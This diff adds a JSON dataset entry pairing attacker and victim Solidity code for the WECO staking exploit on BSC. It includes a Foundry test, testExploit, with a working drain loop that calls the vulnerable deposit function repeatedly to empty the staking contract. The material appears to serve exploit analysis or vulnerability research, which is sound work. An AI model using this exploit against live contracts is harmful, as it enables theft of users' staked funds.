@@ -1,0 +1,100 @@
+[
+  {
+    "contract/interface": "WECOExploit",
+    "source_type": "attacker_contract",
+    "function_name": "IS_TEST",
+    "original_code": "",
+    "description": ""
+  },
+  {
+    "contract/interface": "WECOExploit",
+    "source_type": "attacker_contract",
+    "function_name": "excludeArtifacts",
+    "original_code": "    function excludeArtifacts() public view returns (string[] memory excludedArtifacts_) {\n        excludedArtifacts_ = _excludedArtifacts;\n    }\n\n",
+    "description": ""
+  },
+  {
+    "contract/interface": "WECOExploit",
+    "source_type": "attacker_contract",
+    "function_name": "excludeContracts",
+    "original_code": "    function excludeContracts() public view returns (address[] memory excludedContracts_) {\n        excludedContracts_ = _excludedContracts;\n    }\n\n",
+    "description": ""
+  },
+  {
+    "contract/interface": "WECOExploit",
+    "source_type": "attacker_contract",
+    "function_name": "excludeSenders",
+    "original_code": "    function excludeSenders() public view returns (address[] memory excludedSenders_) {\n        excludedSenders_ = _excludedSenders;\n    }\n\n",
+    "description": ""
+  },
+  {
+    "contract/interface": "WECOExploit",
+    "source_type": "attacker_contract",
+    "function_name": "failed",
+    "original_code": "    function failed() public view returns (bool) {\n        if (_failed) {\n            return _failed;\n        } else {\n            return vm.load(address(vm), bytes32(\"failed\")) != bytes32(0);\n        }\n",
+    "description": ""
+  },
+  {
+    "contract/interface": "WECOExploit",
+    "source_type": "attacker_contract",
+    "function_name": "setUp",
+    "original_code": "    function setUp() public {\n        vm.createSelectFork(\"bsc\", blocknumToForkFrom);\n        vm.label(address(WECOStaking), \"WECOStaking\");\n        vm.label(address(WECOIN), \"WECOIN\");\n    }\n\n",
+    "description": ""
+  },
+  {
+    "contract/interface": "WECOExploit",
+    "source_type": "attacker_contract",
+    "function_name": "targetArtifactSelectors",
+    "original_code": "    function targetArtifactSelectors() public view returns (FuzzSelector[] memory targetedArtifactSelectors_) {\n        targetedArtifactSelectors_ = _targetedArtifactSelectors;\n    }\n\n",
+    "description": ""
+  },
+  {
+    "contract/interface": "WECOExploit",
+    "source_type": "attacker_contract",
+    "function_name": "targetArtifacts",
+    "original_code": "    function targetArtifacts() public view returns (string[] memory targetedArtifacts_) {\n        targetedArtifacts_ = _targetedArtifacts;\n    }\n\n",
+    "description": ""
+  },
+  {
+    "contract/interface": "WECOExploit",
+    "source_type": "attacker_contract",
+    "function_name": "targetContracts",
+    "original_code": "    function targetContracts() public view returns (address[] memory targetedContracts_) {\n        targetedContracts_ = _targetedContracts;\n    }\n\n",
+    "description": ""
+  },
+  {
+    "contract/interface": "WECOExploit",
+    "source_type": "attacker_contract",
+    "function_name": "targetInterfaces",
+    "original_code": "    function targetInterfaces() public view returns (FuzzInterface[] memory targetedInterfaces_) {\n        targetedInterfaces_ = _targetedInterfaces;\n    }\n",
+    "description": ""
+  },
+  {
+    "contract/interface": "WECOExploit",
+    "source_type": "attacker_contract",
+    "function_name": "targetSelectors",
+    "original_code": "    function targetSelectors() public view returns (FuzzSelector[] memory targetedSelectors_) {\n        targetedSelectors_ = _targetedSelectors;\n    }\n\n",
+    "description": ""
+  },
+  {
+    "contract/interface": "WECOExploit",
+    "source_type": "attacker_contract",
+    "function_name": "targetSenders",
+    "original_code": "    function targetSenders() public view returns (address[] memory targetedSenders_) {\n        targetedSenders_ = _targetedSenders;\n    }\n\n",
+    "description": ""
+  },
+  {
+    "contract/interface": "WECOExploit",
+    "source_type": "attacker_contract",
+    "function_name": "testExploit",
+    "original_code": "    function testExploit() public {\n        // Initial WECOIN balance. There was a transfer of WECOIN tokens from exploiter to attack contract\n        // https://app.blocksec.com/explorer/tx/bsc/0x6129e18fdba3b4d3f1e6c3c9c448cafcbee5b5c82e4bbb69a404360f0e579051\n        deal(address(WECOIN), address(this), 25_000_001 ether);\n        uint256 WECOINBeforeBalance = WECOIN.balanceOf(address(this));\n        WECOIN.approve(address(WECOStaking), type(uint256).max);\n        WECOStaking.deposit(WECOIN.balanceOf(address(this)) - 1 ether, 0);\n        uint256 WECOBalanceBeforeSecondDeposit = WECOIN.balanceOf(address(this));\n        WECOStaking.deposit(WECOIN.balanceOf(address(this)), 0);\n        uint256 WECOBalanceAfterSecondDeposit = WECOIN.balanceOf(address(this));\n        uint256 WECOStakingBalance = WECOIN.balanceOf(address(WECOStaking));\n\n        uint256 i;\n        while (i < WECOStakingBalance / (WECOBalanceAfterSecondDeposit - WECOBalanceBeforeSecondDeposit)) {\n            (bool success,) = address(WECOStaking).call(abi.encodeCall(WECOStaking.deposit, (1 ether, 0)));\n            if (success == false) {\n                break;\n            } else {\n                ++i;\n            }\n",
+    "description": ""
+  },
+  {
+    "contract/interface": "IWECOStaking",
+    "source_type": "victim_contract",
+    "function_name": "deposit",
+    "original_code": "    function deposit(uint _amount, uint256 _weeksLocked) external {\n        if (_amount == 0) {\n            revert SasWecoin__InvalidDepositAmount();\n        }\n        UserInfo storage user = users[msg.sender];\n        // Lock or claim rewards\n        // NOTE here is where offsetpoints are updated 1 time\n        _claimAndLock(msg.sender);\n        // get current epoch\n        uint currentEpoch = _currentEpoch();\n        // Deposit amount\n        uint fullAmount = user.depositAmount + _amount;\n        uint bonusStakingPower = user.bonusAmount;\n        totalBonusStakingPower -= bonusStakingPower;\n        totalBaseStakingPower += _amount;\n        if (block.timestamp > stakingStartTime)\n            user.lastAction = block.timestamp;\n        else user.lastAction = stakingStartTime;\n        user.depositAmount = fullAmount;\n        // need to check if there is a previous locking period and extend it.\n        if (\n            _weeksLocked > 0 ||\n            (currentEpoch > 0 && user.endLockEpoch >= currentEpoch)\n        ) {\n            if (user.endLockEpoch >= currentEpoch) {\n                epochs[user.endLockEpoch + 1]\n                    .totalBonusStakingPowerAdjustment -= user.bonusAmount;\n                user.endLockEpoch += _weeksLocked;\n                user.lockDuration = user.endLockEpoch - currentEpoch;\n            } else {\n                user.endLockEpoch = _weeksLocked + currentEpoch;\n                user.lockDuration = _weeksLocked;\n            }\n\n            uint multiplier = calculateMultiplier(user.lockDuration);\n            bonusStakingPower = (fullAmount * multiplier) / SQRT_ADJUSTMENT;\n            bonusStakingPower -= fullAmount;\n            // Set the adjustment needed when the end epoch arrives\n            epochs[user.endLockEpoch + 1]\n                .totalBonusStakingPowerAdjustment += bonusStakingPower;\n\n            user.bonusAmount = bonusStakingPower;\n            totalBonusStakingPower += bonusStakingPower;\n        } else {\n            user.bonusAmount = 0;\n        }\n\n        // adjust offsetPoints here as well\n        user.offsetPoints =\n            ((fullAmount + bonusStakingPower) *\n                accumulatedRewardsPerStakingPower) /\n            MAGNIFIER;\n        // Transfer in WECOIN\n        WECOIN.transferFrom(msg.sender, address(this), _amount);\n    }\n\n",
+    "description": ""
+  }
+]
